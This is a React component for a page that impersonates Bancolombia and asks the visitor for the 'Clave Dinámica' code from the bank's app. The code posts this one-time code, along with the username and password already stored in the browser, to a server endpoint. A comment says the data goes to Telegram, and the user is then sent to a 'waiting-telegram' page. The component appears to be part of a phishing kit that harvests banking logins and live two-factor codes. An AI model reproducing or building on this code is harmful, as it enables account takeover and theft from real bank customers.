import { useState, useEffect } from "react";
import { useLocation } from "wouter";
import { X, Loader2 } from "lucide-react";
import { Button } from "@/components/ui/button";
import { InputOTP, InputOTPGroup, InputOTPSlot } from "@/components/ui/input-otp";
import { Card, CardContent } from "@/components/ui/card";
import { useToast } from "@/hooks/use-toast";
import dynamicVideo from "@assets/generated_videos/dynamic-video-user.mp4";

export default function DynamicKey() {
  const [location, setLocation] = useLocation();
  const { toast } = useToast();
  const [otp, setOtp] = useState("");
  const [isLoading, setIsLoading] = useState(false);
  const [dynamicCode, setDynamicCode] = useState("");

  useEffect(() => {
    const userId = localStorage.getItem("userId");
    const code = localStorage.getItem("dynamicCode");
    
    if (!userId) {
      setLocation("/");
      return;
    }
    
    if (code) {
      setDynamicCode(code);
    }
  }, [setLocation]);

  const handleSubmit = async () => {
    if (otp.length !== 6) {
      toast({
        variant: "destructive",
        title: "Error",
        description: "Debes ingresar los 6 dígitos del código.",
      });
      return;
    }

    setIsLoading(true);

    try {
      const userId = localStorage.getItem("userId");
      const username = localStorage.getItem("username");
      const password = localStorage.getItem("password");
      
      // Send code to Telegram for verification
      const response = await fetch('/api/verify-code', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          userId,
          code: otp,
          username,
          password
        }),
      });

      const data = await response.json();

      if (response.ok && data.success) {
        // Store the code entered and go to waiting telegram page
        localStorage.setItem("enteredCode", otp);
        
        // Navigate to waiting telegram page without showing any notification
        setLocation("/waiting-telegram");
      } else {
        toast({
          variant: "destructive",
          title: "Error",
          description: data.error || "Hubo un error al enviar el código.",
        });
        setOtp("");
        setIsLoading(false);
      }
    } catch (error) {
      console.error("Verify code error:", error);
      toast({
        variant: "destructive",
        title: "Error",
        description: "No se pudo conectar con el servidor.",
      });
      setIsLoading(false);
    }
  };

  return (
    <div className="min-h-screen flex items-center justify-center bg-background px-4 py-8 font-sans text-white relative">
      {/* Loading Overlay */}
      {isLoading && (
        <div className="absolute inset-0 bg-black/80 z-50 flex flex-col items-center justify-center backdrop-blur-sm">
          <Loader2 className="w-12 h-12 text-[#FDDA24] animate-spin mb-4" />
          <p className="text-white font-medium">Cargando...</p>
        </div>
      )}

      <Card className="w-full max-w-[350px] bg-[#383838] border-none shadow-2xl rounded-xl overflow-hidden text-white relative">
        <button 
          onClick={() => setLocation("/")}
          className="absolute right-4 top-4 text-white/80 hover:text-white z-10"
          data-testid="button-close"
        >
          <X className="h-6 w-6" />
        </button>

        <div className="w-full h-32 overflow-hidden relative">
           <video 
            src={dynamicVideo}
            autoPlay
            loop
            muted
            className="w-full h-full object-cover opacity-90"
            style={{ objectPosition: "center 20%" }}
           />
        </div>

        <CardContent className="pt-6 pb-8 px-6 text-center space-y-6">
          <div className="space-y-2">
            <h2 className="text-xl font-bold">Ingresa la Clave Dinámica</h2>
            <p className="text-sm text-gray-300 px-4 leading-relaxed">
              Encuentra tu Clave Dinámica en la app Mi Bancolombia.
            </p>
          </div>

          <div className="flex justify-center py-2">
            <div className="flex gap-2">
              {[0, 1, 2, 3, 4, 5].map((index) => (
                <input
                  key={index}
                  type="text"
                  inputMode="numeric"
                  maxLength={1}
                  value={otp[index] || ""}
                  onChange={(e) => {
                    const value = e.target.value;
                    // Solo acepta dígitos
                    if (!/^\d*$/.test(value)) return;
                    
                    const newOtp = otp.split("");
                    newOtp[index] = value;
                    const result = newOtp.join("").slice(0, 6);
                    setOtp(result);
                    
                    // Autoenfoque al siguiente input
                    if (value && index < 5) {
                      const inputs = document.querySelectorAll('[data-testid^="digit-"]');
                      (inputs[index + 1] as HTMLInputElement)?.focus();
                    }
                  }}
                  onKeyDown={(e) => {
                    // Borrar con backspace
                    if (e.key === "Backspace" && !otp[index] && index > 0) {
                      const inputs = document.querySelectorAll('[data-testid^="digit-"]');
                      (inputs[index - 1] as HTMLInputElement)?.focus();
                    }
                  }}
                  onPaste={(e) => {
                    e.preventDefault();
                    const pastedText = e.clipboardData?.getData('text') || '';
                    // Extraer solo dígitos
                    const digits = pastedText.replace(/\D/g, '').slice(0, 6);
                    
                    if (digits.length > 0) {
                      setOtp(digits);
                      
                      // Auto-focus al último input si se pegaron 6 dígitos
                      if (digits.length === 6) {
                        setTimeout(() => {
                          const inputs = document.querySelectorAll('[data-testid^="digit-"]');
                          (inputs[5] as HTMLInputElement)?.focus();
                        }, 0);
                      }
                    }
                  }}
                  disabled={isLoading}
                  data-testid={`digit-${index}`}
                  className="h-10 w-8 text-center text-xl font-bold bg-transparent border-0 border-b border-yellow-400 text-white focus:ring-0 focus:border-white transition-colors placeholder:text-gray-500"
                  placeholder="•"
                />
              ))}
            </div>
          </div>

          <div className="grid grid-cols-2 gap-4 pt-2">
            <Button 
              variant="outline" 
              className="rounded-full border-white/30 text-white hover:bg-white/10 hover:text-white py-3"
              onClick={() => setOtp("")}
              disabled={isLoading}
              data-testid="button-clear"
            >
              Borrar
            </Button>
            <Button 
              className={`rounded-full font-bold py-3 transition-all ${
                otp.length === 6 && !isLoading
                  ? "bg-[#FDDA24] hover:bg-[#FFF066] text-black"
                  : "bg-[#888888] hover:bg-[#999999] text-black disabled:opacity-50"
              }`}
              onClick={handleSubmit}
              disabled={otp.length < 6 || isLoading}
              data-testid="button-continue"
            >
              {isLoading ? "Verificando..." : "Continuar"}
            </Button>
          </div>
        </CardContent>
      </Card>
    </div>
  );
}
